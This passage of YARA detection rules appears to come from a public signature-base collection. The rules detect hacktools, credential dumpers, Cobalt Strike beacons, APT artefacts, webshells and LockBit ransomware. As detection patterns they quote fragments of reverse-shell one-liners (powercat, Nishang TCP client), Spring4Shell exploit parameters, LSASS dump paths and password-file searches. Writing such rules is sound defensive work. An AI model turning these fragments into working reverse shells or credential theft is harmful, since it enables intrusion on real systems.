		$s6 = "0    :PORTSCAN READY."

	condition:
		all of them
}

rule SIGNATURE_BASE_Proport_Zip_Folder_Proport_1
{
	meta:
		description = "Auto-generated rule on file ProPort.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "cd611f6c-42ed-5cd3-a6ab-7e0970925e61"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L377-L394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c1937a86939d4d12d10fc44b7ab9ab27"
		logic_hash = "0ee2ffc5ed243d170b8013b3a164a3719f43bd473f4af7e1a2697d88a298fe9f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Corrupt Data!"
		$s1 = "K4p~omkIz"
		$s2 = "DllTrojanScan"
		$s3 = "GetDllInfo"
		$s4 = "Compressed by Petite (c)1999 Ian Luck."
		$s5 = "GetFileCRC32"
		$s6 = "GetTrojanNumber"
		$s7 = "TFAKAbout"

	condition:
		all of them
}

rule SIGNATURE_BASE_Stealthwasp_S_Basic_Portscanner_V1_2_1
{
	meta:
		description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "7f706186-f2e2-5d4d-951a-2ec8fc757cec"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L396-L407"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7c0f2cab134534cd35964fe4c6a1ff00"
		logic_hash = "b01c165b5e5be3ba6905e8bc44a14c3d7195effd058e4c0c31678777d19db8b5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Basic PortScanner"
		$s6 = "Now scanning port:"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bluesportscan_1
{
	meta:
		description = "Auto-generated rule on file BluesPortScan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "4bcb8b7c-5e22-5496-9a29-66e85e3c3395"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L409-L420"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6292f5fc737511f91af5e35643fc9eef"
		logic_hash = "5cb4e4b87eaf166c85d23114f5abc10ef83b4a29968bf6fef4b3fce7ff2787fd"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "This program was made by Volker Voss"
		$s1 = "JiBOo~SSB"

	condition:
		all of them
}

rule SIGNATURE_BASE_Scanarator_Iis_1
{
	meta:
		description = "Auto-generated rule on file iis.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "a467147b-53c8-53db-aa33-5f0e4e066988"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L422-L433"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3a8fc02c62c8dd65e038cc03e5451b6e"
		logic_hash = "092cb902e10624b207b7932e6b3c1fe2277ed1d183e5de9ee4d07d8548e90ab6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "example: iis 10.10.10.10"
		$s1 = "send error"

	condition:
		all of them
}

rule SIGNATURE_BASE_Stealth_Stealth_1
{
	meta:
		description = "Auto-generated rule on file Stealth.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5f45882e-3e27-596d-8725-fad380e1c297"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L435-L446"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8ce3a386ce0eae10fc2ce0177bbc8ffa"
		logic_hash = "e210b1a553549c22f66511dfc9d0d3f5b17f02981b9e9915827bc909f34b3262"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "<table width=\"60%\" bgcolor=\"black\" cellspacing=\"0\" cellpadding=\"2\" border=\"1\" bordercolor=\"white\"><tr><td>"
		$s6 = "This tool may be used only by system administrators. I am not responsible for "

	condition:
		all of them
}

rule SIGNATURE_BASE_Angry_IP_Scanner_V2_08_Ipscan_1
{
	meta:
		description = "Auto-generated rule on file ipscan.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "5fbcbb95-6cd4-5587-bf44-5b5ed133ce5e"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L448-L460"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "70cf2c09776a29c3e837cb79d291514a"
		logic_hash = "1b50856ad35c146a684298a86f1629c45996ab08ffae8486a388805262ec2367"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "_H/EnumDisplay/"
		$s5 = "ECTED.MSVCRT0x"
		$s8 = "NotSupported7"

	condition:
		all of them
}

rule SIGNATURE_BASE_Crack_Loader_1
{
	meta:
		description = "Auto-generated rule on file Loader.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		id = "0c4c7b69-7739-5c1b-8c7c-4aaa724e4455"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L462-L473"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f4f79358a6c600c1f0ba1f7e4879a16d"
		logic_hash = "3380ace7c34c15dfd9a9625c8c4a1ed7e35c1cf3c2eca9b1e00dd0092d256150"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "NeoWait.exe"
		$s1 = "RRRRRRRW"

	condition:
		all of them
}

rule SIGNATURE_BASE_WCE_Modified_1_1014_1
{
	meta:
		description = "Modified (packed) version of Windows Credential Editor"
		author = "Florian Roth (Nextron Systems)"
		id = "536d1a7f-bda1-5c22-bf72-a177468e7c42"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L738-L752"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "09a412ac3c85cedce2642a19e99d8f903a2e0354"
		logic_hash = "f094d635aabea9b9101fad3d0d23ad37692317ae5b4f636296ee612752c4421f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "LSASS.EXE" fullword ascii
		$s1 = "_CREDS" ascii
		$s9 = "Using WCE " ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Bypassuac2_1
{
	meta:
		description = "Auto-generated rule - file BypassUac2.zip"
		author = "yarGen Yara Rule Generator"
		id = "8b7e49de-9b0a-5dc4-86af-1a854dc649cc"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L955-L967"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ef3e7dd2d1384ecec1a37254303959a43695df61"
		logic_hash = "398783fa0453a60fd1c6aa64eacfbfa7c5385e81c79d1b6a8a8386dae9b825cc"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "/BypassUac/BypassUac/BypassUac_Utils.cpp" fullword ascii
		$s1 = "/BypassUac/BypassUacDll/BypassUacDll.aps" fullword ascii
		$s3 = "/BypassUac/BypassUac/BypassUac.ico" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Bypassuacdll_6_1
{
	meta:
		description = "Auto-generated rule - file BypassUacDll.aps"
		author = "yarGen Yara Rule Generator"
		id = "5be27053-446f-5ea3-a242-2661aeffa3df"
		date = "2025-04-14"
		modified = "2025-04-14"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L1000-L1011"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
		logic_hash = "3cb89875ddf79a3709aeb58149e228e03b9fb43fa1565aab5ece743857b4cc71"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s3 = "BypassUacDLL.dll" fullword wide
		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Lazagne_Gen_18_1
{
	meta:
		description = "Detects Lazagne password extractor hacktool"
		author = "Florian Roth (Nextron Systems)"
		id = "034ea6d8-f5cf-5664-9ff9-24d19403093d"
		date = "2018-12-11"
		modified = "2025-04-14"
		reference = "https://creativecommons.org/licenses/by-nc/4.0/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L4572-L4589"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6f3e895080267a551a3b7a0ba2d4207b31befacbd35d1e6941e1b69d7e2689ce"
		score = 80
		quality = 85
		tags = ""
		hash1 = "51121dd5fbdfe8db7d3a5311e3e9c904d644ff7221b60284c03347938577eecf"

	strings:
		$x1 = "lazagne.config.powershell_execute(" ascii
		$x2 = "creddump7.win32." ascii
		$x3 = "lazagne.softwares.windows.hashdump" ascii
		$x4 = ".softwares.memory.libkeepass.common(" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_HKTL_Nopowershell_1
{
	meta:
		description = "Detects NoPowerShell hack tool"
		author = "Florian Roth (Nextron Systems)"
		id = "17d508d5-833f-5232-a071-dbed8758493b"
		date = "2018-12-28"
		modified = "2022-12-21"
		reference = "https://github.com/bitsadmin/nopowershell"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-hacktools.yar#L4591-L4608"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2207af9fcc61d547dfeff347a1eae2c59024a7270d1b8cbb7abef56d80864728"
		score = 75
		quality = 85
		tags = ""
		hash1 = "2dad091dd00625762a7590ce16c3492cbaeb756ad0e31352a42751deb7cf9e70"

	strings:
		$x1 = "\\NoPowerShell.pdb" ascii
		$x2 = "Invoke-WmiMethod -Class Win32_Process -Name Create \"cmd" fullword wide
		$x3 = "ls C:\\Windows\\System32 -Include *.exe | select -First 10 Name,Length" fullword wide
		$x4 = "ls -Recurse -Force C:\\Users\\ -Include *.kdbx" fullword wide
		$x5 = "NoPowerShell.exe" fullword wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_Hvs_APT27_Hyperbro_Stage3_Persistence_1
{
	meta:
		description = "HyperBro Stage 3 registry keys for persistence"
		author = "Marko Dorfhuber"
		id = "2bb1d28b-5fc4-5f0b-b546-c8b8192b0d48"
		date = "2022-02-07"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/en/threat-intelligence-report-emissary-panda-apt27"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_apt27_hyperbro.yar#L103-L117"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "db4b7be2bafe29b5e7c81a90e17a660cf73cff1c2e8edd04a9421daba09e3e0e"
		score = 75
		quality = 85
		tags = ""
		hash1 = "624e85bd669b97bc55ed5c5ea5f6082a1d4900d235a5d2e2a5683a04e36213e8"

	strings:
		$ = "SOFTWARE\\WOW6432Node\\Microsoft\\config_" ascii
		$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\windefenders" ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Irontiger_Wmiexec_1
{
	meta:
		description = "Iron Tiger Tool - wmi.vbs detection"
		author = "Cyber Safety Solutions, Trend Micro"
		id = "a3060f50-3594-5da9-98e2-6fa0087451f5"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://goo.gl/T5fSJC"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_irontiger_trendmicro.yar#L259-L276"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "7988b993345e13b64e5f02ecd2679fc484b063a4cd2f18b52d00d2dfa34d82cb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$str1 = "Temp Result File , Change it to where you like" wide ascii
		$str2 = "wmiexec" wide ascii
		$str3 = "By. Twi1ight" wide ascii
		$str4 = "[both mode] ,delay TIME to read result" wide ascii
		$str5 = "such as nc.exe or Trojan" wide ascii
		$str6 = "+++shell mode+++" wide ascii
		$str7 = "win2008 fso has no privilege to delete file" wide ascii

	condition:
		2 of ( $str* )
}

rule SIGNATURE_BASE_HKTL_Redmimicry_Agent_1
{
	meta:
		description = "matches the RedMimicry agent executable and payload"
		author = "mirar@chaosmail.org"
		id = "a4d4ec77-4a0d-5afd-9181-85433e8b5fda"
		date = "2020-06-22"
		modified = "2023-01-06"
		reference = "https://redmimicry.com"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_redmimicry.yar#L2-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "645da2764ca911c4aae80b90622d2c61933dee929403858fc49f7bc0d44300c6"
		score = 75
		quality = 85
		tags = ""
		sharing = "tlp:white"

	strings:
		$reg0 = "HKEY_CURRENT_USER\\" ascii
		$reg1 = "HKEY_LOCAL_MACHINE\\" ascii
		$reg2 = "HKEY_CURRENT_CONFIG\\" ascii
		$reg3 = "HKEY_CLASSES_ROOT\\" ascii
		$cmd0 = "C:\\Windows\\System32\\cmd.exe" ascii fullword
		$lua0 = "client_recv" ascii fullword
		$lua1 = "client_send" ascii fullword
		$lua2 = "$LuaVersion: " ascii
		$sym0 = "VirtualAllocEx" wide fullword
		$sym1 = "kernel32.dll" wide fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Cobaltstrike_Unmodifed_Beacon_1
{
	meta:
		description = "Detects unmodified CobaltStrike beacon DLL"
		author = "yara@s3c.za.net"
		id = "8eeb03f9-9698-5a46-b45b-224d5c3f3df7"
		date = "2019-08-16"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_cobaltstrike_evasive.yar#L309-L320"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "10114a431fb70be8e18e67b22aa76bf2c0536f07d373f717c1dc51755e0847c9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$loader_export = "ReflectiveLoader"
		$exportname = "beacon.dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_Strings_1
{
	meta:
		description = "Identifies strings used in Cobalt Strike Beacon DLL"
		author = "Elastic"
		id = "af558aa2-a3dc-5a7a-bc74-42bb2246091c"
		date = "2021-03-16"
		modified = "2023-12-05"
		reference = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_cobaltstrike.yar#L54-L67"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "4349a7ad94df2269217b55c2aef9628c4eef078566c276936accdd4f996ba2cf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "%02d/%02d/%02d %02d:%02d:%02d"
		$s2 = "Started service %s on %s"
		$s3 = "%s as %s\\%s: %d"

	condition:
		2 of them
}

rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_XOR_Strings_1
{
	meta:
		description = "Identifies XOR'd strings used in Cobalt Strike Beacon DLL"
		author = "Elastic"
		id = "359160a8-cf1c-58a8-bf7f-c09a8d661308"
		date = "2021-03-16"
		modified = "2023-12-05"
		reference = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_cobaltstrike.yar#L69-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b5009c29055784ce6371100417b862f723d7e3c1b4081c563fcd8770db48051f"
		score = 75
		quality = 85
		tags = ""
		xor_s1 = "%02d/%02d/%02d %02d:%02d:%02d"
		xor_s2 = "Started service %s on %s"
		xor_s3 = "%s as %s\\%s: %d"

	strings:
		$s1 = "%02d/%02d/%02d %02d:%02d:%02d" xor(0x01-0xff)
		$s2 = "Started service %s on %s" xor(0x01-0xff)
		$s3 = "%s as %s\\%s: %d" xor(0x01-0xff)
		$fp1 = "MalwareRemovalTool"

	condition:
		2 of ( $s* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_APT_SUSP_NK_3CX_Malicious_Samples_Mar23_1_1
{
	meta:
		description = "Detects indicator (event name) found in samples related to 3CX compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "b233846a-19df-579b-a674-233d66824008"
		date = "2023-03-30"
		modified = "2023-12-05"
		reference = "https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_mal_3cx_compromise_mar23.yar#L216-L232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6ab8a4ac184eaba6eb56bfc49d6fa03f9b0877d75294aa9a242e9ac96482fab0"
		score = 70
		quality = 85
		tags = ""
		hash1 = "7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896"
		hash2 = "59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983"
		hash3 = "aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868"
		hash4 = "c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02"

	strings:
		$a1 = "AVMonitorRefreshEvent" wide fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_EXPL_Manageengine_CVE_2022_47966_Jan23_1_1
{
	meta:
		description = "Detects indicators of exploitation of ManageEngine vulnerability as described by Horizon3"
		author = "Florian Roth (Nextron Systems)"
		id = "07535b9c-8611-5a46-bcd7-f94070de2aea"
		date = "2023-01-13"
		modified = "2023-12-05"
		reference = "https://www.horizon3.ai/manageengine-cve-2022-47966-iocs/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_manageengine_jan23.yar#L2-L14"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a62064e4f12632ba6c14cbbd9369ee919536334f19021a177c126b5dff7e568c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "]: com.adventnet.authentication.saml.SamlException: Signature validation failed. SAML Response rejected|"

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Jdniexploit_Error_Indicators_Dec21_1_1
{
	meta:
		description = "Detects error messages related to JDNI usage in log files that can indicate a Log4Shell / Log4j exploitation"
		author = "Florian Roth (Nextron Systems)"
		id = "68bcf043-58b4-54a9-b024-64871b5d535f"
		date = "2021-12-10"
		modified = "2023-06-23"
		reference = "https://twitter.com/marcioalm/status/1470361495405875200?s=20"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_log4j_cve_2021_44228.yar#L213-L226"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2ab98814b2ed66b0bda875fecc0b09db82035d7edcdb0af65f815817ec8c6cc8"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "FATAL log4j - Message: BadAttributeValueException: "

	condition:
		1 of them
}

rule SIGNATURE_BASE_EXPL_POC_Springcore_0Day_Indicators_Mar22_1_1
{
	meta:
		description = "Detects indicators found after SpringCore exploitation attempts and in the POC script"
		author = "Florian Roth (Nextron Systems)"
		id = "297e4b57-f831-56e0-a391-1ffbc9a4d438"
		date = "2022-03-30"
		modified = "2023-12-05"
		reference = "https://twitter.com/vxunderground/status/1509170582469943303"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_spring4shell.yar#L19-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "39fb62ec7953dae0a88e39e73e3ff286fc19cb8f21f8feb869a1875f6ba70cfb"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di"
		$x2 = "?pwd=j&cmd=whoami"
		$x3 = ".getParameter(%22pwd%22)"
		$x4 = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B"

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Email_Redirection_Spoofing_Feb25_1
{
	meta:
		description = "Detects redirect spoofing in embedded URLs. This technique is used by threat actors to obscure the actual destination of a link"
		author = "Jonathan Peters (cod3nym)"
		id = "bf3a2b06-4dc5-5f0f-bf1f-2bd6a1cc4a8d"
		date = "2025-02-20"
		modified = "2025-03-20"
		reference = "https://any.run/cybersecurity-blog/cyber-attacks-january-2025/#fake-youtube-links-redirect-users-to-phishing-pages-11298"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/susp_email_redirection_spoofing.yar#L1-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9b196220b369c199a7e4d57cb5db18b32eb2565a6f9190929c5c01ac4fa04ac8"
		hash = "c4eb35c1a1c10226bff9bb0c88ca516441208d193b4994eeb292a66e53a2cc04"
		hash = "e3b8ea03a472348814c6ac81088234836e627a1878ec36e46ce62526e1390935"
		logic_hash = "9a411317821751dc0873fe3163791115d1e19bc4d57119ed2ba513b444864032"
		score = 70
		quality = 85
		tags = ""

	strings:
		$sa1 = "Content-Transfer-Encoding:" ascii
		$sa2 = "Subject:" ascii
		$x = ".com%20%20%20%20%20%" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Cobaltgang_PDF_Metadata_Rev_A_1
{
	meta:
		description = "Find documents saved from the same potential Cobalt Gang PDF template"
		author = "Palo Alto Networks Unit 42"
		id = "bcf5bf6e-c786-5f78-bf58-e0631a17e62e"
		date = "2018-10-25"
		modified = "2023-12-05"
		reference = "https://researchcenter.paloaltonetworks.com/2018/10/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/crime_cobalt_gang_pdf.yar#L1-L12"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8020ccff761b49d98e18cd5cb3c0695956a88e86a0958bfba1a19b7e3e629bb9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "<xmpMM:DocumentID>uuid:31ac3688-619c-4fd4-8e3f-e59d0354a338" ascii wide

	condition:
		any of them
}

rule SIGNATURE_BASE_APT_HAFNIUM_Forensic_Artefacts_Mar21_1_1
{
	meta:
		description = "Detects forensic artefacts found in HAFNIUM intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "872822b0-34d9-5ae4-a532-6a8786494fa9"
		date = "2021-03-02"
		modified = "2023-12-05"
		reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_hafnium.yar#L35-L48"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "eb86595956092506c2e29373faaf39a3987f9feed36a53b191bedd498db05cbb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "lsass.exe C:\\windows\\temp\\lsass" ascii wide fullword
		$s2 = "c:\\ProgramData\\it.zip" ascii wide fullword
		$s3 = "powercat.ps1'); powercat -c" ascii wide fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_HKTL_Nishang_PS1_Invoke_Powershelltcponeline_1
{
	meta:
		description = "Detects PowerShell Oneliner in Nishang's repository"
		author = "Florian Roth (Nextron Systems)"
		id = "0218ebbd-2dbe-5838-ab53-1e78e3f97b9e"
		date = "2021-03-03"
		modified = "2023-12-05"
		reference = "https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_hafnium.yar#L105-L119"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "59622bff95de1077d26ee4547f37cd1045c0c1fc6817df40ff2564b33a962a07"
		score = 75
		quality = 85
		tags = ""
		hash1 = "2f4c948974da341412ab742e14d8cdd33c1efa22b90135fcfae891f08494ac32"

	strings:
		$s1 = "=([text.encoding]::ASCII).GetBytes((iex $" ascii wide
		$s2 = ".GetStream();[byte[]]$" ascii wide
		$s3 = "New-Object Net.Sockets.TCPClient('" ascii wide

	condition:
		all of them
}

rule SIGNATURE_BASE_WEBSHELL_Proxyshell_Exploitation_Nov21_1_1
{
	meta:
		description = "Detects webshells dropped by DropHell malware"
		author = "Florian Roth (Nextron Systems)"
		id = "300eaadf-db0c-5591-84fc-abdf7cdd90c1"
		date = "2021-11-01"
		modified = "2025-03-21"
		reference = "https://www.deepinstinct.com/blog/do-not-exchange-it-has-a-shell-inside"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_proxyshell.yar#L252-L266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d9812d3f53c346c4e318609e0c7de66811b27ffa7528a6ddeb6ac8436da59ef5"
		score = 85
		quality = 85
		tags = ""

	strings:
		$s01 = ".LoadXml(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request[" ascii wide
		$s02 = "new System.IO.MemoryStream()" ascii wide
		$s03 = "Transform(" ascii wide

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_MAL_RANSOM_Lockbit_Apr23_1_1
{
	meta:
		description = "Detects indicators found in LockBit ransomware"
		author = "Florian Roth"
		id = "75dc8b95-16f0-5170-a7d6-fc10bb778348"
		date = "2023-04-17"
		modified = "2023-12-05"
		reference = "https://objective-see.org/blog/blog_0x75.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_lockbit_lnx_macos_apr23.yar#L43-L67"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "cd5bffa5571abfd1446b065d26c8c23f00fe1376d505af539c6f37356014a86f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$xe1 = "-i '/path/to/crypt'" xor
		$xe2 = "http://lockbit" xor
		$s1 = "idelayinmin" ascii
		$s2 = "bVMDKmode" ascii
		$s3 = "bSelfRemove" ascii
		$s4 = "iSpotMaximum" ascii
		$fp1 = "<html"

	condition:
		(1 of ( $x* ) or 4 of them ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_MAL_RANSOM_Lockbit_Locker_LOG_Apr23_1_1
{
	meta:
		description = "Detects indicators found in LockBit ransomware log files"
		author = "Florian Roth"
		id = "aa0a2393-e5a2-5151-8afb-91a9bb922179"
		date = "2023-04-17"
		modified = "2023-12-05"
		reference = "https://objective-see.org/blog/blog_0x75.html"
